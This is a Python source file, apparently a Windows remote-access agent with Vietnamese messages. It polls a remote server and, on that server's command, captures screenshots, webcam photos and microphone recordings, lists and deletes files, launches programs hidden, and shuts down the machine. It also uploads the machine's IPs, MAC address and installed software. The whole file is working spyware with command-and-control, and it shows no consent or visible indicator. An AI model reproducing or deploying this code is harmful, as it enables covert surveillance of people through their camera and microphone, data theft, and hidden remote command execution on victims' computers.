import time
import platform
import uuid
import psutil
import requests
import base64
import subprocess
import os
import winreg
from io import BytesIO
from PIL import ImageGrab

import cv2
import sounddevice as sd
import soundfile as sf

CACHED_CAMERAS = None
CACHED_MICROPHONES = None

def get_all_ips():
    ips = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                ips.append(f"{interface}: {addr.address}")
    return ips if ips else ["Không tìm thấy IP"]

def get_gpu_info():
    gpus_data = []
    try:
        cmd = "wmic path win32_VideoController get Name, AdapterRAM"
        output = subprocess.check_output(cmd, shell=True, creationflags=0x08000000).decode('utf-8', errors='ignore')
        lines = output.strip().split('\n')[1:]
        for line in lines:
            line = line.strip()
            if not line: continue
            parts = line.split()
            if len(parts) >= 2:
                try:
                    ram_bytes = int(parts[0])
                    ram_mb = f"{round(ram_bytes / (1024**2), 0)} MB"
                except ValueError: ram_mb = "Tự động chia sẻ"
                gpu_name = line[line.find(parts[1]):].strip()
                gpus_data.append({"name": gpu_name, "load": "Tự động điều tốc", "memory_total": ram_mb})
    except Exception: pass
    return gpus_data

def get_top_apps():
    cpu_groups = {}
    ram_groups = {}
    num_cores = psutil.cpu_count(logical=True) or 1
    ignore_list = ["system idle process", "unexpected", "memcompression", "svchost", "registry", "system", "conhost", "csrss", "lsass", "services", "wininit", "smss"]
    
    for proc in psutil.process_iter(['name', 'cpu_percent', 'memory_info']):
        try:
            info = proc.info
            name = info['name']
            if not name: continue
            display_name = name.split('.')[0] if '.' in name else name
            if display_name.lower() in ignore_list: continue
            
            cpu_val = (info['cpu_percent'] or 0) / num_cores
            cpu_groups[display_name] = cpu_groups.get(display_name, 0) + cpu_val
            
            ram_val = info['memory_info'].rss if info['memory_info'] else 0
            ram_groups[display_name] = ram_groups.get(display_name, 0) + ram_val
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue

    sorted_cpu = sorted(cpu_groups.items(), key=lambda x: x[1], reverse=True)
    top_cpu_list = [f"{name} ({round(cpu, 1)}%)" for name, cpu in sorted_cpu if cpu > 0.0][:5]

    sorted_ram = sorted(ram_groups.items(), key=lambda x: x[1], reverse=True)[:5]
    top_ram_list = [f"{name} ({round(ram / (1024**2), 1)} MB)" for name, ram in sorted_ram]

    return {"top_cpu": top_cpu_list, "top_ram": top_ram_list}

def get_installed_apps():
    apps = set()
    reg_paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
    ]
    for hkey, path in reg_paths:
        try:
            with winreg.OpenKey(hkey, path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        sub_key_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, sub_key_name) as sub_key:
                            name, _ = winreg.QueryValueEx(sub_key, "DisplayName")
                            if name and len(name.strip()) > 1:
                                apps.add(name.strip())
                    except Exception: pass
        except Exception: pass
    return sorted(list(apps)) if apps else ["Radmin VPN", "UltraViewer", "Google Chrome"]

def list_directory_contents(target_path):
    try:
        if not target_path or target_path == "ROOT":
            drives = []
            for part in psutil.disk_partitions():
                if 'cdrom' not in part.opts and part.fstype:
                    drives.append({"name": part.device, "path": part.device, "is_dir": True})
            return {"status": "success", "current_path": "ROOT", "items": drives}

        if not os.path.exists(target_path):
            return {"status": "error", "message": "Đường dẫn không tồn tại"}

        items = []
        for entry in os.scandir(target_path):
            try:
                items.append({"name": entry.name, "path": entry.path, "is_dir": entry.is_dir()})
            except Exception: pass
        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
        return {"status": "success", "current_path": target_path, "items": items}
    except Exception as e: return {"status": "error", "message": str(e)}

def get_uptime_str():
    uptime_seconds = time.time() - psutil.boot_time()
    days = int(uptime_seconds // (24 * 3600))
    uptime_seconds %= (24 * 3600)
    hours = int(uptime_seconds // 3600)
    uptime_seconds %= 3600
    minutes = int(uptime_seconds // 60)
    return f"{days} ngày, {hours} giờ, {minutes} phút"

def scan_cameras_once():
    """Mở rộng vòng lặp lên 5 thiết bị để quét triệt để các Cam ngoài USB"""
    global CACHED_CAMERAS
    if CACHED_CAMERAS is not None: return CACHED_CAMERAS
    camera_list = []
    for index in range(5):
        cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
        if cap.isOpened():
            camera_list.append({"index": index, "name": f"Camera Thiết Bị #{index}"})
            cap.release()
    CACHED_CAMERAS = camera_list if camera_list else [{"index": 0, "name": "Camera Mặc Định"}]
    return CACHED_CAMERAS

def scan_microphones_once():
    """Tự động quét tìm toàn bộ danh sách Microphone đầu vào thực tế trên Windows"""
    global CACHED_MICROPHONES
    if CACHED_MICROPHONES is not None: return CACHED_MICROPHONES
    mic_list = []
    try:
        devices = sd.query_devices()
        for idx, dev in enumerate(devices):
            if dev['max_input_channels'] > 0:
                name_vietnamese = dev['name'].encode('utf-8', errors='ignore').decode('utf-8')
                mic_list.append({"index": idx, "name": f"Mic {idx}: {name_vietnamese}"})
    except Exception: pass
    CACHED_MICROPHONES = mic_list if mic_list else [{"index": 0, "name": "Microphone Mặc Định"}]
    return CACHED_MICROPHONES

def take_camera_shot(cam_index):
    cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
    if not cap.isOpened(): return "ERROR: Camera bận!"
    ret, frame = cap.read()
    cap.release()
    if not ret: return "ERROR: Lỗi đọc luồng."
    ret, buffer = cv2.imencode('.jpg', frame)
    return "data:image/jpeg;base64," + base64.b64encode(buffer).decode('utf-8')

def record_microphone(mic_index, duration=5, sample_rate=16000):
    try:
        recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, device=mic_index, dtype='float32')
        sd.wait()
        buffered = BytesIO()
        sf.write(buffered, recording, sample_rate, format='WAV')
        return "data:audio/wav;base64," + base64.b64encode(buffered.getvalue()).decode('utf-8')
    except Exception as e: return f"ERROR: {str(e)}"

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.thumbnail((1024, 768)) 
        buffered = BytesIO()
        screenshot.save(buffered, format="JPEG", quality=70)
        return "data:image/jpeg;base64," + base64.b64encode(buffered.getvalue()).decode('utf-8')
    except Exception: return None

def execute_power_command(cmd_type):
    try:
        if cmd_type == "shutdown": os.system("shutdown /s /t 1")
        elif cmd_type == "restart": os.system("shutdown /r /t 1")
        elif cmd_type == "sleep": os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    except Exception: pass

def launch_app_hidden(app_name):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0 
        subprocess.Popen(app_name, shell=True, startupinfo=startupinfo, creationflags=0x08000000)
        return f"SUCCESS: Đã khởi chạy ngầm '{app_name}'"
    except Exception as e: return f"ERROR: {str(e)}"

def get_complete_system_info():
    svmem = psutil.virtual_memory()
    disk_info = []
    for partition in psutil.disk_partitions():
        try:
            if 'cdrom' in partition.opts or not partition.fstype: continue
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info.append({"device": partition.device, "percentage": f"{usage.percent}%", "free": f"{round(usage.free / (1024**3), 2)} GB"})
        except Exception: continue

    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    top_apps = get_top_apps()

    return {
        "computer_name": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "architecture": platform.machine(),
        "boot_time": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time())),
        "uptime": get_uptime_str(),
        "mac_address": mac_address,
        "all_ips": get_all_ips(),
        "cpu": {"current_usage": f"{psutil.cpu_percent()}%"},
        "ram": {"percentage": f"{svmem.percent}%", "used": f"{round(svmem.used / (1024**3), 2)} GB", "total": f"{round(svmem.total / (1024**3), 2)} GB"},
        "gpus": get_gpu_info(),
        "disks": disk_info,
        "total_tasks": len(psutil.pids()),
        "top_cpu_names": top_apps["top_cpu"],  
        "top_ram_names": top_apps["top_ram"],  
        "installed_apps_list": get_installed_apps(),
        "cameras": scan_cameras_once(),
        "microphones": scan_microphones_once() # Đẩy danh sách Microphone quét động lên Web
    }

def send_data_to_cloud():
    URL = "http://username.pythonanywhere.com/update-status"
    psutil.cpu_percent(interval=None)
    
    screenshot_data, cam_data, mic_data, app_log_result = None, None, None, None
    file_manager_response = None

    while True:
        try:
            payload = get_complete_system_info()
            if screenshot_data: payload["screenshot"] = screenshot_data; screenshot_data = None
            if cam_data: payload["cam_result"] = cam_data; cam_data = None
            if mic_data: payload["mic_result"] = mic_data; mic_data = None
            if app_log_result: payload["app_execute_result"] = app_log_result; app_log_result = None
            if file_manager_response: payload["file_manager_data"] = file_manager_response; file_manager_response = None
                
            response = requests.post(URL, json=payload, timeout=8)
            if response.status_code == 200:
                res_json = response.json()
                
                file_cmd = res_json.get("trigger_file_command")
                if file_cmd:
                    cmd_type = file_cmd.get("type")
                    target_path = file_cmd.get("path")
                    if cmd_type == "list": file_manager_response = list_directory_contents(target_path)
                    elif cmd_type == "delete":
                        try:
                            if os.path.isdir(target_path): os.rmdir(target_path)
                            else: os.remove(target_path)
                            app_log_result = f"SUCCESS: Đã xóa tại {target_path}"
                        except Exception as e: app_log_result = f"ERROR: {str(e)}"
                    elif cmd_type == "execute": app_log_result = launch_app_hidden(target_path)

                trigger_power = res_json.get("trigger_power_command")
                if trigger_power: execute_power_command(trigger_power)
                
                trigger_app = res_json.get("trigger_launch_app")
                if trigger_app: app_log_result = launch_app_hidden(trigger_app)

                if res_json.get("trigger_screenshot") == True: screenshot_data = take_screenshot()
                if res_json.get("trigger_cam_index") is not None: cam_data = take_camera_shot(int(res_json["trigger_cam_index"]))
                if res_json.get("trigger_mic_index") is not None: mic_data = record_microphone(int(res_json["trigger_mic_index"]))
                    
        except Exception: pass
        time.sleep(1.5)

if __name__ == "__main__":
    send_data_to_cloud()